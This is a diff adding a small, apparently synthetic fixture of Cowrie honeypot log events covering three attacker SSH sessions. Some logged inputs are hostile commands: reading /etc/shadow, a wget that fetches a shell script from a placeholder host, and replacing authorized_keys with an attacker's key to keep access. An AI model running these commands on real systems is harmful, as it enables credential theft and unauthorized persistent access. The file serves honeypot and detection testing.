@@ -1,0 +1,14 @@
+{"eventid": "cowrie.session.connect", "session": "a1b2c3d4", "src_ip": "203.0.113.10", "src_port": 51022, "timestamp": "2026-01-01T10:00:00.000000Z", "sensor": "honeypot-1"}
+{"eventid": "cowrie.login.success", "session": "a1b2c3d4", "username": "root", "password": "123456", "timestamp": "2026-01-01T10:00:01.000000Z"}
+{"eventid": "cowrie.command.input", "session": "a1b2c3d4", "input": "uname -a", "timestamp": "2026-01-01T10:00:02.000000Z"}
+{"eventid": "cowrie.command.input", "session": "a1b2c3d4", "input": "whoami", "timestamp": "2026-01-01T10:00:03.000000Z"}
+{"eventid": "cowrie.command.input", "session": "a1b2c3d4", "input": "cat /etc/shadow", "timestamp": "2026-01-01T10:00:05.000000Z"}
+{"eventid": "cowrie.command.input", "session": "a1b2c3d4", "input": "wget http://example.invalid/x.sh -O /tmp/x.sh", "timestamp": "2026-01-01T10:00:08.000000Z"}
+{"eventid": "cowrie.session.closed", "session": "a1b2c3d4", "duration": 42.7, "timestamp": "2026-01-01T10:00:42.000000Z"}
+{"eventid": "cowrie.session.connect", "session": "e5f6a7b8", "src_ip": "198.51.100.23", "src_port": 40044, "timestamp": "2026-01-01T11:30:00.000000Z", "sensor": "honeypot-2"}
+{"eventid": "cowrie.login.success", "session": "e5f6a7b8", "username": "admin", "password": "admin", "timestamp": "2026-01-01T11:30:00.500000Z"}
+{"eventid": "cowrie.command.input", "session": "e5f6a7b8", "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3Nz mdrfckr' > .ssh/authorized_keys && chmod 600 .ssh/authorized_keys", "timestamp": "2026-01-01T11:30:01.000000Z"}
+{"eventid": "cowrie.session.closed", "session": "e5f6a7b8", "duration": 2.1, "timestamp": "2026-01-01T11:30:02.000000Z"}
+{"eventid": "cowrie.session.connect", "session": "c9d0e1f2", "src_ip": "192.0.2.77", "src_port": 33122, "timestamp": "2026-01-01T12:15:00.000000Z", "sensor": "honeypot-1"}
+{"eventid": "cowrie.command.input", "session": "c9d0e1f2", "input": "ls -la", "timestamp": "2026-01-01T12:15:00.300000Z"}
+{"eventid": "cowrie.session.closed", "session": "c9d0e1f2", "duration": 0.9, "timestamp": "2026-01-01T12:15:01.000000Z"}
